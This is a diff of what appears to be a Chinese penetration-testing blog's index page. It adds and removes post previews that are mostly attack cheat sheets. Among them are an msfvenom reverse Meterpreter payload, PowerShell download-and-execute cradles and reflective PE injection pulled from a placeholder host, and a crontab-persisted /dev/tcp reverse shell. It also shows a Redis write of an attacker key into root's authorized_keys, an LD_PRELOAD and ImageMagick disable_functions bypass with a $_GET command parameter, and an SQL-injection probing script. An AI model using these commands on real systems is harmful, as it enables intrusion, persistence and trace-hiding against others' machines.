@@ -117,6 +117,210 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2018/06/13/powershell-pen.html" >Powershell</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2018-06-13  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-none"><code class="language-none">反弹123端口的powershell
+msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x. LPORT&#x3D;123 -f psh-reflection &gt;123.ps1
+powershell.exe -exec Bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;123.ps1&#39;)&quot;
+
+
+端口扫描:
+powershell -exec bypass -c &quot;444..446 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;x.x.x.x&#39;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&quot;
+
+自定义端口和IP
+1..20 | % &#123; $a &#x3D; $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+
+
+1..20 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+169..171 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;103.27.177.$a&quot;; 445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+
+
+
+powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx
+
+内存加载运行:
+powershell.exe -exec bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;clymb3r&#x2F;PowerShell&#x2F;master&#x2F;Invoke-ReflectivePEInjection&#x2F;Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;x.x.x.x&#x2F;2.exe -ExeArgs &#39;whoami&#39; -ForceASLR&quot; 
+
+
+下载文件:
+(New-Object System.Net.Webclient).DownloadFile(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;k.aspx&quot;,&quot;&quot;)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</a></li>
+</ul>
+<p>在使用msf生成ps的payload的时候，对于生成的文件格式是hta-psh解码顺序是这样的，对于其中的base64编码，先正常的base64解码，然后提取解码之后中的base64，保存为1.txt，使用如下脚本解码:</p>
+<pre class="line-numbers language-none"><code class="language-none">python decode.py 1.txt
+
+#&#x2F;usr&#x2F;bin&#x2F;env python
+# coding:utf-8
+
+import base64
+import gzip
+import StringIO
+import sys
+
+f &#x3D; sys.argv[1]
+with open(f, &quot;rb&quot;) as file:
+    data &#x3D; file.read()
+
+decoded&#x3D;base64.b64decode(data)
+res &#x3D; StringIO.StringIO(decoded)
+for i in gzip.GzipFile(fileobj&#x3D;res):
+    print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2018/06/13/powershell-pen.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-none"><code class="language-none">反弹123端口的powershell
+msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x. LPORT&#x3D;123 -f psh-reflection &gt;123.ps1
+powershell.exe -exec Bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;123.ps1&#39;)&quot;
+
+
+端口扫描:
+powershell -exec bypass -c &quot;444..446 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;x.x.x.x&#39;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&quot;
+
+自定义端口和IP
+1..20 | % &#123; $a &#x3D; $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+
+
+1..20 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+169..171 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;103.27.177.$a&quot;; 445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+
+
+
+powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx
+
+内存加载运行:
+powershell.exe -exec bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;clymb3r&#x2F;PowerShell&#x2F;master&#x2F;Invoke-ReflectivePEInjection&#x2F;Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;x.x.x.x&#x2F;2.exe -ExeArgs &#39;whoami&#39; -ForceASLR&quot; 
+
+
+下载文件:
+(New-Object System.Net.Webclient).DownloadFile(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;k.aspx&quot;,&quot;&quot;)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</a></li>
+</ul>
+<p>在使用msf生成ps的payload的时候，对于生成的文件格式是hta-psh解码顺序是这样的，对于其中的base64编码，先正常的base64解码，然后提取解码之后中的base64，保存为1.txt，使用如下脚本解码:</p>
+<pre class="line-numbers language-none"><code class="language-none">python decode.py 1.txt
+
+#&#x2F;usr&#x2F;bin&#x2F;env python
+# coding:utf-8
+
+import base64
+import gzip
+import StringIO
+import sys
+
+f &#x3D; sys.argv[1]
+with open(f, &quot;rb&quot;) as file:
+    data &#x3D; file.read()
+
+decoded&#x3D;base64.b64decode(data)
+res &#x3D; StringIO.StringIO(decoded)
+for i in gzip.GzipFile(fileobj&#x3D;res):
+    print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2018/06/13/powershell-pen.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2018/06/05/local-network-pentest.html" >内网渗透注意事项</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2018-06-05  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="内网定时反弹"><a href="#内网定时反弹" class="headerlink" title="内网定时反弹:"></a>内网定时反弹:</h3><pre class="line-numbers language-none"><code class="language-none">(crontab -l;printf &quot;* * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;xx;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>上面反弹之后，在centos下面，如果没有监听shell的情况下，终端一直会有<code>you have an email in /var/spool/root</code>, 解决方法如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">echo &quot;unset MAILCHECK&quot; &gt;&gt; ~&#x2F;.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="Redis写私钥"><a href="#Redis写私钥" class="headerlink" title="Redis写私钥"></a>Redis写私钥</h3><p>常规操作:</p>
+<pre class="line-numbers language-none"><code class="language-none">config get dir  &#x2F;&#x2F;获取当前的目录, 默认: &#x2F;usr&#x2F;local&#x2F;redis
+config get dbfilename &#x2F;&#x2F; 获取当前名字 默认: dump.rdb
+config set dir &#x2F;root&#x2F;.ssh
+config set dbfilename &quot;authorized_keys&quot;
+set xx &quot;\n\n pub_key\n\n&quot;
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>之后拿到shell，然后再把dir和dbfilename改回来，顺便把known_hosts给删除掉。</p>
+<p>redis查看部分key: </p>
+<pre class="line-numbers language-none"><code class="language-none">scan 1000 MATCH * COUNT 1000
+get [key]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2018/06/05/local-network-pentest.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="内网定时反弹"><a href="#内网定时反弹" class="headerlink" title="内网定时反弹:"></a>内网定时反弹:</h3><pre class="line-numbers language-none"><code class="language-none">(crontab -l;printf &quot;* * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;xx;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>上面反弹之后，在centos下面，如果没有监听shell的情况下，终端一直会有<code>you have an email in /var/spool/root</code>, 解决方法如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">echo &quot;unset MAILCHECK&quot; &gt;&gt; ~&#x2F;.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="Redis写私钥"><a href="#Redis写私钥" class="headerlink" title="Redis写私钥"></a>Redis写私钥</h3><p>常规操作:</p>
+<pre class="line-numbers language-none"><code class="language-none">config get dir  &#x2F;&#x2F;获取当前的目录, 默认: &#x2F;usr&#x2F;local&#x2F;redis
+config get dbfilename &#x2F;&#x2F; 获取当前名字 默认: dump.rdb
+config set dir &#x2F;root&#x2F;.ssh
+config set dbfilename &quot;authorized_keys&quot;
+set xx &quot;\n\n pub_key\n\n&quot;
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>之后拿到shell，然后再把dir和dbfilename改回来，顺便把known_hosts给删除掉。</p>
+<p>redis查看部分key: </p>
+<pre class="line-numbers language-none"><code class="language-none">scan 1000 MATCH * COUNT 1000
+get [key]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2018/06/05/local-network-pentest.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2018/03/02/openresty-https.html" >如何截取openresty反向代理服务器数据包</a>
 		</h3>
 		</div>
@@ -369,572 +573,6 @@ DTD文档类型定义
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/12/12/bypass-disabled-functions.html" >bypass disable functions</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-12-12  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p>
-<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-void payload() &#123;
-system(&quot;echo aaaaa&gt; &#x2F;tmp&#x2F;abc.txt&quot;);
-&#125;
-int geteuid() &#123;
-if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; 
-unsetenv(&quot;LD_PRELOAD&quot;);
-payload();
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
-putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;hack.so&quot;);
-mail(&quot;a[@localhost](&#x2F;user&#x2F;localhost)&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p> 使用方法：</p>
-<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC hack.c -o hack
-gcc -shared hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>修改hack.c文件里面的内容即可执行命令，经过测试在lnmp一键安装包可以顺利执行。<br>在gcc编译的时候可以放在其他linux上面编译，好了之后上传到目标服务器。</p>
-<p>====<br>2018.8.22:</p>
-<p>使用imageMagick 绕过:</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;
-
-$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
-if ($command &#x3D;&#x3D; &#39;&#39;) &#123;
-    $command &#x3D; &#39;id&#39;;
-&#125;
-
-$exploit &#x3D; &lt;&lt;&lt;EOF
-push graphic-context
-viewbox 0 0 640 480
-fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;
-pop graphic-context
-EOF;
-
-file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
-$thumb &#x3D; new Imagick();
-$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
-$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
-$thumb-&gt;clear();
-$thumb-&gt;destroy();
-unlink(&quot;KKKK.mvg&quot;);
-unlink(&quot;KKKK.png&quot;);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>上面的比较老，最新的imagemagic漏洞:</p>
-	
-
-	</div>
-  <a type="button" href="/2017/12/12/bypass-disabled-functions.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://threathunter.org/topic/596d90d5dff9e14c40b61986">https://threathunter.org/topic/596d90d5dff9e14c40b61986</a></p>
-<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-void payload() &#123;
-system(&quot;echo aaaaa&gt; &#x2F;tmp&#x2F;abc.txt&quot;);
-&#125;
-int geteuid() &#123;
-if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; 
-unsetenv(&quot;LD_PRELOAD&quot;);
-payload();
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
-putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;hack.so&quot;);
-mail(&quot;a[@localhost](&#x2F;user&#x2F;localhost)&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p> 使用方法：</p>
-<pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC hack.c -o hack
-gcc -shared hack -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>修改hack.c文件里面的内容即可执行命令，经过测试在lnmp一键安装包可以顺利执行。<br>在gcc编译的时候可以放在其他linux上面编译，好了之后上传到目标服务器。</p>
-<p>====<br>2018.8.22:</p>
-<p>使用imageMagick 绕过:</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;
-
-$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
-if ($command &#x3D;&#x3D; &#39;&#39;) &#123;
-    $command &#x3D; &#39;id&#39;;
-&#125;
-
-$exploit &#x3D; &lt;&lt;&lt;EOF
-push graphic-context
-viewbox 0 0 640 480
-fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;
-pop graphic-context
-EOF;
-
-file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
-$thumb &#x3D; new Imagick();
-$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
-$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
-$thumb-&gt;clear();
-$thumb-&gt;destroy();
-unlink(&quot;KKKK.mvg&quot;);
-unlink(&quot;KKKK.png&quot;);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>上面的比较老，最新的imagemagic漏洞:</p>
-	
-	</div>
-  <a type="button" href="/2017/12/12/bypass-disabled-functions.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/12/11/producer-consumer.html" >生产者消费者模型</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-12-11  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>代码捉急,先看例子:</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>jianshu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span>d85a4329d0c2<span class="token operator">></span>
-<span class="token comment">#!/usr/bin/env python</span>
-<span class="token comment"># -*- coding: utf-8 -*-</span>
-
-<span class="token keyword">import</span> threading
-<span class="token keyword">import</span> Queue
-<span class="token keyword">import</span> random
-<span class="token keyword">import</span> time
-
-
-<span class="token keyword">class</span> <span class="token class-name">Producter</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token triple-quoted-string string">"""生产者线程"""</span>
-    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue
-        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>
-
-    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            randomnum <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span>
-            self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>randomnum<span class="token punctuation">)</span>
-            <span class="token keyword">print</span> <span class="token string">'put num in Queue %s'</span> <span class="token operator">%</span>  randomnum
-            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-
-        <span class="token keyword">print</span> <span class="token string">'put queue done'</span>
-
-
-<span class="token keyword">class</span> <span class="token class-name">ConsumeEven</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token triple-quoted-string string">"""奇数消费线程"""</span>
-    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t_name<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        self<span class="token punctuation">.</span>queue <span class="token operator">=</span> queue
-        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token operator">=</span>t_name<span class="token punctuation">)</span>
-
-    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-            <span class="token keyword">try</span><span class="token punctuation">:</span>
-                queue_val <span class="token operator">=</span> self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
-            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
-                <span class="token keyword">print</span> e
-                <span class="token keyword">break</span><span class="token punctuation">;</span>
-
-            <span class="token keyword">if</span> queue_val <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
-                <span class="token keyword">print</span> <span class="token string">'Get Even Num %s '</span> <span class="token operator">%</span> queue_val
-            <span class="token keyword">else</span><span class="token punctuation">:</span>
-                self<span class="token punctuation">.</span>queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>queue_val<span class="token punctuation">)</span>
-
-
-q <span class="token operator">=</span> Queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
-pt <span class="token operator">=</span> Producter<span class="token punctuation">(</span><span class="token string">'producter'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
-ce <span class="token operator">=</span> ConsumeEven<span class="token punctuation">(</span><span class="token string">'consumeeven'</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
-ce<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
-pt<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
-pt<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
-ce<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>照着写:</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-# coding: utf-8
-
-from elasticsearch import Elasticsearch
-import requests
-from Queue import Queue
-import time
-import threading
-import datetime
-
-es &#x3D; Elasticsearch(&#39;xxxxxx:9200&#39;, http_auth&#x3D;(&#39;user&#39;, &#39;password&#39;))
-
-
-class Producter(threading.Thread):
-	def __init__(self, queue):
-		threading.Thread.__init__(self)
-		self.queue &#x3D; queue
-		self.initime &#x3D; datetime.datetime.now().strftime(&#39;%Y.%m.%d&#39;)
-
-
-	def initsearch(self):
-		dsl_query &#x3D; &#123;
-		  &quot;query&quot;: &#123;
-		    &quot;match&quot;: &#123;
-		      &quot;method&quot;: &#123;
-		        &quot;query&quot;: &quot;GET&quot;,
-		        &quot;type&quot;: &quot;phrase&quot;
-		      &#125;
-		    &#125;
-		  &#125;,
-			&quot;size&quot;: 100,
-		&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;]
-		&#125;
-		res &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + self.initime, body&#x3D;dsl_query)
-		latest_time &#x3D; res[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]
-		return latest_time
-
-
-	def run(self):
-		latest_time &#x3D; self.initsearch()
-		while 1:
-			lastindex &#x3D; latest_time.split(&#39;T&#39;)[0].replace(&#39;-&#39;, &#39;.&#39;)  # 获取最新的index
-			dsl_query2 &#x3D; &#123;
-				&quot;query&quot;: &#123;
-					&quot;bool&quot;: &#123;
-						&quot;must&quot;: &#123;
-							&quot;match&quot;: &#123;
-								&quot;method&quot;: &quot;GET&quot;
-							&#125;
-						&#125;,
-						&quot;filter&quot;: &#123;
-							&quot;range&quot;: &#123;
-								&quot;@timestamp&quot;: &#123;
-									&quot;gte&quot;: latest_time
-								&#125;
-							&#125;
-						&#125;
-					&#125;
-				&#125;,
-				&quot;sort&quot;: [&#123;&quot;@timestamp&quot;: &#123;&quot;order&quot;: &quot;desc&quot;&#125;&#125;],
-				&quot;size&quot;: 1000
-			&#125;
-			time.sleep(10)
-			res2 &#x3D; es.search(index&#x3D;&quot;packetbeat-&quot; + lastindex, body&#x3D;dsl_query2)
-			for hit in res2[&#39;hits&#39;][&#39;hits&#39;]:
-				# print hit[&#39;_source&#39;][&#39;@timestamp&#39;], hit[&#39;_id&#39;], hit[&#39;_source&#39;][&#39;path&#39;]
-				self.queue.put([hit[&#39;_source&#39;][&#39;path&#39;], hit[&#39;_source&#39;][&#39;http&#39;][&#39;request&#39;][&#39;params&#39;], hit[&#39;_source&#39;][&#39;method&#39;]])
-				print &quot;Put %s&quot; % hit[&#39;_id&#39;]
-				print hit[&#39;_source&#39;][&#39;@timestamp&#39;]
-			latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]
-
-
-class Consumer(threading.Thread):
-	def __init__(self, queue):
-		threading.Thread.__init__(self)
-		self.queue &#x3D; queue
-
-	#
-	# def http_curl(self):
-	# 	# http_client &#x3D; AsyncHTTPClient()
-	# 	path &#x3D; self.request[0]
-	# 	param &#x3D; self.request[1]
-	# 	method &#x3D; self.request[2]
-	# 	if method &#x3D;&#x3D; &quot;GET&quot;:
-	# 		##判断get的param是否是空
-	# 		if not param:
-	# 			pass
-	# 		else:
-	# 			rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)
-	# 			print &quot;Curl %s&quot; % self.request
-	# 			print rep.status_code
-	# 	else:
-	# 		#留着写POST请求判断
-	# 		pass
-
-
-	def run(self):
-		while 1:
-			try:
-				request &#x3D; self.queue.get()
-				path &#x3D; request[0]
-				param &#x3D; request[1]
-				method &#x3D; request[2]
-				if method &#x3D;&#x3D; &#39;GET&#39;:
-					if not param:
-						pass
-					else:
-						rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)
-				#else  写POST
-				print &quot;Get %s&quot; % request
-				print rep.status_code
-			except Exception as e:
-				raise e
-
-q &#x3D; Queue()
-pt &#x3D; Producter(q)
-ce &#x3D; Consumer(q)
-ce.start()
-pt.start()
-pt.join()
